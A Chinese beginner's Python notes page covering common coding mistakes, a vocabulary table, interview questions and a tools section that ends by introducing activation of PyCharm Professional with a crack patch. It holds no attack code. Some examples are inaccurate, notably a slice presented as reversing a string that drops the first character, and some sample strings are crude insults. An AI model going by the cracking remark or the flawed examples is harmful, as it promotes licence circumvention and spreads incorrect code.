<h3 id="6-步长是从当前索引开始的"><a href="#6-步长是从当前索引开始的" class="headerlink" title="6.步长是从当前索引开始的"></a>6.步长是从当前索引开始的</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;hello&#x27;</span>b = a[::<span class="number">2</span>] <span class="built_in">print</span>(b) <span class="comment">#结果为hlo,并不是elo</span></span><br></pre></td></tr></table></figure>

<h3 id="7-查找字符所在的索引位置：find"><a href="#7-查找字符所在的索引位置：find" class="headerlink" title="7.查找字符所在的索引位置：find( )"></a>7.查找字符所在的索引位置：find( )</h3><ul>
<li><p>易错点：该方法是字符串的专属方法，列表、元组都无法使用</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404171220884.png" alt="image-20200404171220884"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404171317170.png" alt="image-20200404171317170"></p>
</li>
</ul>
<h3 id="8-查找字符在字符串中出现的次数：count"><a href="#8-查找字符在字符串中出现的次数：count" class="headerlink" title="8.查找字符在字符串中出现的次数：count()"></a>8.查找字符在字符串中出现的次数：count()</h3><ul>
<li><p>易错点：不仅适用于字符串，也适用于列表、元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串使用counttext = &#x27;好，狗屎，好了,好&#x27;index = text.count(&#x27;好&#x27;)  #查看好在列表中出现的次数print(index)   #结果为3#元组中使用counttext = (&#x27;好&#x27;,&#x27;狗屎&#x27;,&#x27;好了&#x27;,&#x27;好&#x27;)index = text.count(&#x27;好&#x27;)  #查看好在元组中出现的次数print(index)   #结果为2#列表中使用counttext = [&#x27;好&#x27;,&#x27;狗屎&#x27;,&#x27;好了&#x27;,&#x27;好&#x27;]index = text.count(&#x27;好&#x27;)  #查看好在列表中出现的次数print(index)   #结果为2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="9-循环输入时错误的将输入语句放到了循环外"><a href="#9-循环输入时错误的将输入语句放到了循环外" class="headerlink" title="9.循环输入时错误的将输入语句放到了循环外"></a>9.循环输入时错误的将输入语句放到了循环外</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">int</span>( <span class="built_in">input</span>(<span class="string">&#x27;请猜测我的年龄：&#x27;</span>) )count = 0<span class="keyword">while</span> count &lt; <span class="number">3</span> :    <span class="keyword">if</span> age == <span class="number">26</span> :        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了！&#x27;</span>)        <span class="keyword">break</span>    <span class="keyword">else</span> :        <span class="built_in">print</span>(<span class="string">&#x27;猜测错误！&#x27;</span>)    count += <span class="number">1</span><span class="comment">#结果是&#x27;&#x27;&#x27;请猜测我的年龄：69猜测错误！猜测错误！猜测错误！&#x27;&#x27;&#x27;#正确做法，因为是循环输入，所以必须要将输入语句放到循环里才行count = 0while count &lt; 3 :    age = int(input(&#x27;请猜测我的年龄：&#x27;))    if age == 26 :        print(&#x27;恭喜你猜对了！&#x27;)        break    else :        print(&#x27;猜测错误！&#x27;)    count += 1</span></span><br></pre></td></tr></table></figure>



<h3 id="10-字符串方法replace，不填数字默认全部替换"><a href="#10-字符串方法replace，不填数字默认全部替换" class="headerlink" title="10.字符串方法replace，不填数字默认全部替换"></a>10.字符串方法replace，不填数字默认全部替换</h3><ul>
<li><p>易错点：不填数字是默认全部替换，而不是只替换一处。</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405110024156.png" alt="image-20200405110024156"></p>
</li>
</ul>
<h3 id="11-切片中括号下标的范围"><a href="#11-切片中括号下标的范围" class="headerlink" title="11.切片中括号下标的范围"></a>11.切片中括号下标的范围</h3><ul>
<li><p>a = ‘abcdef’,</p>
<p>a[0:5]：这里包含索引0所对应的值，但是不包含索引5对应的值,所以这里的结果是：abcde</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;abc&quot;</span><span class="built_in">print</span>(name[-<span class="number">2</span>:-<span class="number">1</span>])  <span class="comment">##错误语句，结果为b，不包含-1这个索引的值，所以错误print(name[-2:])    #正确语句，结果为bc</span></span><br></pre></td></tr></table></figure>



<h3 id="12-find-和count-功能使用混淆"><a href="#12-find-和count-功能使用混淆" class="headerlink" title="12.find()和count()功能使用混淆"></a>12.find()和count()功能使用混淆</h3><ul>
<li>find()返回的只是需要查找的元素所对应的索引位置，一定要记住是索引位置</li>
<li>count()返回的是指定字符在字符串里出现的次数，通俗的将就是查看该字符在字符串里有多少个，返回的是一个数量，数字。</li>
</ul>
<h3 id="13-列表追加元素出现并打印出现None"><a href="#13-列表追加元素出现并打印出现None" class="headerlink" title="13.列表追加元素出现并打印出现None"></a>13.列表追加元素出现并打印出现None</h3><p>原因分析：列表是可变类型，对列表进行操作会直接对原列表进行修改，所以无法使用赋值等操作，也无法进行直接打印操作，如果给操作后的列表赋值、打印都会导致None</p>
<ul>
<li><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405144134874.png" alt="image-20200405144134874"></p>
</li>
<li><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405144232058.png" alt="image-20200405144232058"></p>
</li>
<li><p>正确做法是：</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405144408261.png" alt="image-20200405144408261"></li>
</ul>
</li>
</ul>
<h3 id="14-列表插入内容和位置混淆"><a href="#14-列表插入内容和位置混淆" class="headerlink" title="14.列表插入内容和位置混淆"></a>14.列表插入内容和位置混淆</h3><ul>
<li><p>a.insert(位置,’内容’)      代表位置的数字应该填写在前面，内容在后面</p>
<p>错误示例：</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405144921869.png" alt="image-20200405144921869"></li>
</ul>
<p>正确示例：</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405145006083.png" alt="image-20200405145006083"></li>
</ul>
</li>
</ul>
<h3 id="15-pop删除指定索引的值发生索引超出范围问题"><a href="#15-pop删除指定索引的值发生索引超出范围问题" class="headerlink" title="15.pop删除指定索引的值发生索引超出范围问题"></a>15.pop删除指定索引的值发生索引超出范围问题</h3><ul>
<li><p>特点：在删除索引值所对应的值后，后面值会前移，也就是后面的值得索引相对于删除前会往前进一位</p>
</li>
<li><p>易错点：当用户需要删除索引位置2，3，4的元素时，我们不能死板的执行删除索引值为2，3，4的命令，因为当我们删除第一个索引的值时，原来需要删除的索引3所对应的值，会因为删除索引2导致后续的值得索引都前移一位，所以此时，所以原来的索引值3会变化成2，同样的道理，索引4会变成3，如果继续删除，索引还会前移。</p>
<p>错题：</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405155617848.png" alt="image-20200405155617848"></li>
</ul>
<p>正确解决办法：</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405160012196.png" alt="image-20200405160012196"></li>
</ul>
</li>
</ul>
<h3 id="16-append-和extend-的区别"><a href="#16-append-和extend-的区别" class="headerlink" title="16.append()和extend()的区别"></a>16.append()和extend()的区别</h3><ul>
<li><p>append():</p>
<ul>
<li>接受参数可以是任何类型，数值，字符串，列表，元组，作用是将参数所代表的值作为一个整体加入到另外一个列表中，这里强调的是作为一个整体</li>
</ul>
</li>
<li><p>extend():接收的参数必须是一个序列：字符串（可以是单个字符）、列表、元组，必须是序列才行，例如整型（数值）就不行</p>
</li>
<li><p>```python<br>#示例一：appenda = [1,2,3]a.append(10)print(a)   #结果为[1,2,3,10]  10是作为一个整体加入到a中了，因为10本身是一个数值，并不是序列，所以10没有用中括号括起来相当于列表a的一个元素#示例二：appenda = [1,2,3]b = [4,5,6]a.append(b)print(a)   #结果为[1,2,3,[4,5,6]]  b是作为一个整体加入到a中了，b这里是一个序列，所以它是作为一个序列加入到a中，所以需要用中括号括起来表示一个整体，相当于列表a的一个元素#示例三：extendc = [1,2,3]d = [4,5,6]c.extend(d)print(c)    #结果为[1,2,3,4,5,6] ,d中的每一个元素都加到列表a中了，相当于两个列表的合并#示例三：extendc = [1,2,3]c.extend(‘a’)print(c)    #结果为[1,2,3,’a’] ,d这里的’a’是字符串，字符串实际上也是一种序列，所以可以接收该参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 错误示例：</span><br><span class="line"></span><br><span class="line">  - ![image-20200406083702675](https://gitee.com/python_road/python_img/raw/master/img/image-20200406083702675.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 17.切片和索引的取出来的值得类型混淆不清</span><br><span class="line"></span><br><span class="line">- 切片取出来的是列表</span><br><span class="line"></span><br><span class="line">- 索引取出来的是具体的值：字符串、整型</span><br><span class="line"></span><br><span class="line">  错误示例：</span><br><span class="line"></span><br><span class="line">  - ![image-20200405184433913](https://gitee.com/python_road/python_img/raw/master/img/image-20200405184433913.png)</span><br><span class="line"></span><br><span class="line">  正确例子：</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">        li = [1, 3, 2, &quot;a&quot;, 4, &quot;b&quot;, 5,&quot;c&quot;]# 通过对li列表的切片形成新的列表  [&quot;c&quot;]li6 = li[-1:]print(li6)#结果是：[&#x27;c&#x27;]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="18-列表从右往左切片取值"><a href="#18-列表从右往左切片取值" class="headerlink" title="18.列表从右往左切片取值"></a>18.列表从右往左切片取值</h3><ul>
<li><p>易错点：切片的区间和步长不一致</p>
</li>
<li><p>要点：a[m:n]</p>
<p>易错点：不要在意m和n的正负</p>
<ul>
<li>如果是从左往右切片取值，起始索引在列表中所代表的值必须要在终止索引所代表的的值得左边，并且步长要是正数  —-&gt;相当于：因为m是索引起始值，n是索引终止值，那么只要a[m]在列表中所代表的的值在a[n]所代表的的值得左边就行了，同时步长必须要为正数</li>
<li>如果是从右往左切片，起始索引所代表的的值必须要在终止索引所代表的的值得右边，并且步长要是负数—————–&gt;相当于:首先步长必须要为负数，a[m:n:-1]   ,列表里，a[m]所代表的值必须要在a[n所代表的的值的右边即可] </li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#因为是正向取值，a[m:n]在列表中只要a[m]所代表的值1在a[n]所代表的的值得左边就行a = [1,2,3,4]#正向取值，从左往右print(a[0:-2])  #结果为：[1,2]print(a[0:2])   #结果为:[1,2]#因为是逆向取值，从右往左，a[m:n:-1]，a[m]所代表的的值必须要在a[n]所代表的的值的右边#逆向取值，从右往左print(a[2:0:-1])  #结果为：[3,2]print(a[-1:1:-1])  #结果为：[4,3]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="19-嵌套的列表取值定位错误，导致无法插入"><a href="#19-嵌套的列表取值定位错误，导致无法插入" class="headerlink" title="19.嵌套的列表取值定位错误，导致无法插入"></a>19.嵌套的列表取值定位错误，导致无法插入</h3><ul>
<li><p>易错点：在嵌套的列表里修改数据时，定位不精确，导致无法插入</p>
<p>示例：定位到字符串上了，导致该字符串所在的列表无法插入数据</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405193223694.png" alt="image-20200405193223694"></li>
</ul>
<p>正确做法：</p>
<ul>
<li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200405193328835.png" alt="image-20200405193328835"></li>
</ul>
</li>
</ul>
<h3 id="20-操作字典取值"><a href="#20-操作字典取值" class="headerlink" title="20.操作字典取值"></a>20.操作字典取值</h3><p>错误原因：键没有引起来，必须要用单引号引起来</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200407185947643.png" alt="image-20200407185947643"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正确方法：a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;a[&#x27;age&#x27;] = 999   #错误原因：键没有引起来print(a)   #结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 999, &#x27;性别&#x27;: &#x27;男&#x27;&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="21-操作字典使用大括号报错"><a href="#21-操作字典使用大括号报错" class="headerlink" title="21.操作字典使用大括号报错"></a>21.操作字典使用大括号报错</h3><p>原因：使用了大括号，应该用中括号[]</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200407185827602.png" alt="image-20200407185827602"></p>
<h3 id="22-字典get修改值出现函数不能调用"><a href="#22-字典get修改值出现函数不能调用" class="headerlink" title="22.字典get修改值出现函数不能调用"></a>22.字典get修改值出现函数不能调用</h3><p>错误写法：用get修改值</p>
<p>错误信息：cannot assign to function call</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200408190518246.png" alt="image-20200408190518246"></p>
<p>正确写法：用键修改</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200408190326588.png" alt="image-20200408190326588"></p>
<h3 id="23-判断数据A是否在字典B里"><a href="#23-判断数据A是否在字典B里" class="headerlink" title="23.判断数据A是否在字典B里"></a>23.判断数据A是否在字典B里</h3><ul>
<li><p>目的：应该是比对字典里的数据，即比对字典的值</p>
</li>
<li><p>易错点：如果直接比对字典，那么比对的只是字典的键，所以必须使用：A in a.values()  这样才是比对字典里的值</p>
<p>错误写法：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200409104930896.png" alt="image-20200409104930896"></p>
</li>
</ul>
<p>正确写法：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200409105056450.png" alt="image-20200409105056450"></p>
<h3 id="24-字典循环嵌套与内存"><a href="#24-字典循环嵌套与内存" class="headerlink" title="24.字典循环嵌套与内存"></a>24.字典循环嵌套与内存</h3><p>易错点：循环嵌套，嵌套进去的也是指向的数据，而不是某个变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字典循环嵌套与内存1：data_list = []data = &#123;&#125;for i in range(2):    data[&#x27;user&#x27;] = i    data_list.append(data)print(data)    #此时结果为：&#123;&#x27;user&#x27;: 1&#125;#此时data_list的两个元素都是指向同一个字典，所以它两的结果是最后一轮循环修改后的字典数据print(data_list)   #结果为：[&#123;&#x27;user&#x27;: 1&#125;, &#123;&#x27;user&#x27;: 1&#125;]#字典循环嵌套与内存2：a = [1,2,3]b = []for i in range (2):    b.append(a)        #添加的并不是变量，而是所指向的数据a[0] = 66print(b)   #结果为：[[66, 2, 3], [66, 2, 3]]#字典循环嵌套与内存3：a = []b = &#123;&#125;for i in range (2):    b[&#x27;user&#x27;] = i          a.append(i)    print(a)   #结果为：[0, 1]print(b)	#结果为：&#123;&#x27;user&#x27;: 1&#125;#字典循环嵌套与内存4：b = []for i in range(2):    a = &#123;&#125;                  #每次循环都生成一个新字典，所以最终b里都是不同的字典    a[&#x27;user&#x27;] = i    b.append(a)print(b)  #结果为：[&#123;&#x27;user&#x27;: 0&#125;, &#123;&#x27;user&#x27;: 1&#125;]</span></span><br></pre></td></tr></table></figure>



<h3 id="25-文件操作：readline和readlines同时存在无作用"><a href="#25-文件操作：readline和readlines同时存在无作用" class="headerlink" title="25.文件操作：readline和readlines同时存在无作用"></a>25.文件操作：readline和readlines同时存在无作用</h3><p>易错点：</p>
<ul>
<li><p>如果先执行readline()，再执行readlines，那么readline执行就是读取一行，readlines()读取的就是减去之前读取的一行，因为第一次读取，光标到了第一行的末尾，所以第二次读取导致第一行无法读取</p>
</li>
<li><p>如果先执行readlines()，再执行readline()，那么readlines()执行就是读取所有行，readline()读取的就是空，因为第一次读取，光标到了文本的末尾，所以第二次读取导致什么都读取不到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#易错点1示例：&#x27;&#x27;&#x27;#文本内容张三 28李四 25王麻子 20&#x27;&#x27;&#x27;message = open(&#x27;测试.txt&#x27;,mode= &#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)message_readline = message.readline()message_readlines = message.readlines()print(message_readline,message_readlines)&#x27;&#x27;&#x27;结果为：张三 28  [&#x27;李四 25 \n&#x27;, &#x27;王麻子 20&#x27;]&#x27;&#x27;&#x27;#易错点2示例：&#x27;&#x27;&#x27;#文本内容张三 28李四 25王麻子 20&#x27;&#x27;&#x27;message = open(&#x27;测试.txt&#x27;,mode= &#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)message_readlines = message.readlines()message_readline = message.readline()print(message_readline,message_readlines)&#x27;&#x27;&#x27;结果为： [&#x27;张三 28 \n&#x27;, &#x27;李四 25 \n&#x27;, &#x27;王麻子 20&#x27;]&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="26-装饰器的调用"><a href="#26-装饰器的调用" class="headerlink" title="26. 装饰器的调用"></a>26. 装饰器的调用</h3><p>错误1：装饰器的调用语句后面没有紧跟定义函数的语句</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200426204339.png" alt="image-20200426204337146"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>错误2：@ + 函数 +()       这里不应该有括号</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200426205447.png" alt="image-20200426205446399"></p>
<p>错误3：返回装饰器地址时加了括号，报错</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200426211122.png" alt="image-20200426211120806"></p>
<h3 id="27-shutil-rmtree-删除文件夹"><a href="#27-shutil-rmtree-删除文件夹" class="headerlink" title="27.shutil.rmtree()删除文件夹"></a>27.shutil.rmtree()删除文件夹</h3><p>易错点：无法直接删除文件，只能直接删除文件夹，但是如果该文件夹里有其他文件夹或者文件，那么这些文件夹和文件都会被删除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除文件夹树（包括内部的文件夹、文件）import shutil,os,timeos.makedirs(&#x27;E:\oldboy_python\code\文件夹树\文件夹A\文件夹B&#x27;)    #创建文件夹树time.sleep(6)        #延迟5秒，方便直观的观察文件夹树的创建和删除shutil.rmtree(r&#x27;文件夹树&#x27;)      #删除文件夹树</span></span><br></pre></td></tr></table></figure>





<h3 id="28-git报错：git-error-pathspec"><a href="#28-git报错：git-error-pathspec" class="headerlink" title="28.git报错：git error: pathspec"></a>28.git报错：git error: pathspec</h3><p>错误语句：git error: pathspec ‘-‘ did not match any file(s) known to git</p>
<p>错误原因：git commit - m “备注”   时错误，这里应该是双引号，如果用单引号就会报错</p>
<h3 id="29-导入已存在的模块，却找不到方法"><a href="#29-导入已存在的模块，却找不到方法" class="headerlink" title="29.导入已存在的模块，却找不到方法"></a>29.导入已存在的模块，却找不到方法</h3><p>问题：导入一个模块，该模块命名存在，我通过    模块名 + 方法名    调用时，却提示该方法不存在</p>
<p>原因：要搞清楚python找模块的依据，首先会在脚本的当前运行路径查找模块，如果没有，则根据默认的路径来查找，所以这里错误的原因就是在该运行脚本的当前目录下有另外一个py文件，该py文件的名字可能由于我们命名不规范，导致其和我们需要导入的模块的名字一样，所以当我们调用模块时，找到的仅仅只是这一个同名的py文件，又由于该py文件里没有我们需要的方法，所以pycharm就报错了</p>
<p>解决方法：规范py文件的名称，或者使用模块的相对导入方法来导入</p>
<h3 id="30-md5加密导入的是hashlib模块"><a href="#30-md5加密导入的是hashlib模块" class="headerlink" title="30.md5加密导入的是hashlib模块"></a>30.md5加密导入的是hashlib模块</h3><p>错误点：是hashlib模块，并不是md5模块</p>
<p>易错点：调用update和hexdigest函数时，需要手动输入，pycharm里无法补全，容易让人产生错觉（该函数不存在）</p>
<h2 id="附录3-陌生单词"><a href="#附录3-陌生单词" class="headerlink" title="附录3 陌生单词"></a>附录3 陌生单词</h2><table>
<thead>
<tr>
<th align="center">单词</th>
<th align="center">中文意思</th>
</tr>
</thead>
<tbody><tr>
<td align="center">enumerate</td>
<td align="center">枚举</td>
</tr>
<tr>
<td align="center">tuple</td>
<td align="center">元组</td>
</tr>
<tr>
<td align="center">decimal</td>
<td align="center">十进制</td>
</tr>
<tr>
<td align="center">numeric</td>
<td align="center">数字</td>
</tr>
<tr>
<td align="center">devision</td>
<td align="center">除法</td>
</tr>
<tr>
<td align="center">push</td>
<td align="center">推送</td>
</tr>
<tr>
<td align="center">strip</td>
<td align="center">去除</td>
</tr>
<tr>
<td align="center">startswith</td>
<td align="center">以…开始</td>
</tr>
<tr>
<td align="center">assign</td>
<td align="center">分配</td>
</tr>
<tr>
<td align="center">reverse</td>
<td align="center">反转</td>
</tr>
<tr>
<td align="center">message</td>
<td align="center">消息</td>
</tr>
<tr>
<td align="center">switch</td>
<td align="center">开关</td>
</tr>
<tr>
<td align="center">intersection</td>
<td align="center">交叉，交集</td>
</tr>
<tr>
<td align="center">flush</td>
<td align="center">冲刷</td>
</tr>
<tr>
<td align="center">argument</td>
<td align="center">变量</td>
</tr>
<tr>
<td align="center">odd number</td>
<td align="center">奇数</td>
</tr>
<tr>
<td align="center">divmod</td>
<td align="center">商和余数</td>
</tr>
<tr>
<td align="center">verification</td>
<td align="center">验证</td>
</tr>
<tr>
<td align="center">encryption</td>
<td align="center">加密</td>
</tr>
<tr>
<td align="center">prompt</td>
<td align="center">提示</td>
</tr>
<tr>
<td align="center">timestamp</td>
<td align="center">时间戳</td>
</tr>
<tr>
<td align="center">encryption</td>
<td align="center">加密</td>
</tr>
<tr>
<td align="center">perimeter</td>
<td align="center">周长</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="附录4-面试相关试题"><a href="#附录4-面试相关试题" class="headerlink" title="附录4 面试相关试题"></a>附录4 面试相关试题</h2><h3 id="1-编码与储存的关系"><a href="#1-编码与储存的关系" class="headerlink" title="1.编码与储存的关系"></a>1.编码与储存的关系</h3><ul>
<li>既然gbk和gb2312中文占用的字节小，消耗的资源小，那为什么还要用utf-8编码（3个字节）？<ul>
<li>gbk、gb2312支持的范围小</li>
<li>英文是主流语言，各种最新的、最成熟的框架、数据都是用utf-8编码储存或者编写的，如果使用gbk、gb2312将会导致编码冲突，如果将utf-8修改成gbk、gb2312花费的时间太多，并且过程十分繁琐</li>
</ul>
</li>
</ul>
<h3 id="2-字符串倒着打印（利用索引）"><a href="#2-字符串倒着打印（利用索引）" class="headerlink" title="2.字符串倒着打印（利用索引）"></a>2.字符串倒着打印（利用索引）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;王麻子是个傻逼&#x27;</span><span class="built_in">print</span>(a[-<span class="number">1</span>:<span class="number">0</span>:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>



<h3 id="3-小括号特性"><a href="#3-小括号特性" class="headerlink" title="3.小括号特性"></a>3.小括号特性</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#题目：[(1),(2),(3)] 相当于什么？a = [(1),(2),(3)]  #因为小括号特性，这里相当于[1, 2, 3]print(a)</span></span><br></pre></td></tr></table></figure>





<h3 id="4-is和-的区别"><a href="#4-is和-的区别" class="headerlink" title="4.is和==的区别"></a>4.is和==的区别</h3><p>==：是用来比较数值的</p>
<p>is：是用来比较内存地址的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>]b = [<span class="number">1</span>,<span class="number">2</span>]<span class="built_in">print</span>(a == b,a <span class="keyword">is</span> b)<span class="comment">#结果：True False</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#疑难题：为啥结果为True，因为pyton的缓存池a = 3b = 3print(a == b,a is b)#结果为：True True</span></span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例1：v1 = &#123;&#x27;k1&#x27;:&#x27;v1&#x27;,&#x27;k2&#x27;:[1,2,3]&#125;v2 = &#123;&#x27;k1&#x27;:&#x27;v1&#x27;,&#x27;k2&#x27;:[1,2,3]&#125;result1 = v1 == v2 result2 = v1 is v2 print(result1)  #结果为：Trueprint(result2)   #结果为：False，比较的是内存地址#示例2：v1 = &#123;&#x27;k1&#x27;:&#x27;v1&#x27;,&#x27;k2&#x27;:[1,2,3]&#125;v2 = v1                result1 = v1 == v2 result2 = v1 is v2 print(result1)      #True，指向的都是同一个字典print(result2)      #Ture</span></span><br></pre></td></tr></table></figure>





<h3 id="5-简述深浅拷贝"><a href="#5-简述深浅拷贝" class="headerlink" title="5.简述深浅拷贝"></a>5.简述深浅拷贝</h3><p>浅拷贝：拷贝后，拷贝体和源数据互相可以影响</p>
<p>深拷贝：拷贝后，拷贝体和源数据完全独立，无法影响到彼此</p>
<h2 id="附录-5-工具及其使用方法"><a href="#附录-5-工具及其使用方法" class="headerlink" title="附录 5 工具及其使用方法"></a>附录 5 工具及其使用方法</h2><h3 id="1-1-安装pycharm专业版与使用"><a href="#1-1-安装pycharm专业版与使用" class="headerlink" title="1.1 安装pycharm专业版与使用"></a>1.1 安装pycharm专业版与使用</h3><h4 id="1-1-1-安装pycharm专业版"><a href="#1-1-1-安装pycharm专业版" class="headerlink" title="1.1.1 安装pycharm专业版"></a>1.1.1 安装pycharm专业版</h4><ul>
<li><p>激活方法（稳定）：使用补丁破解</p>
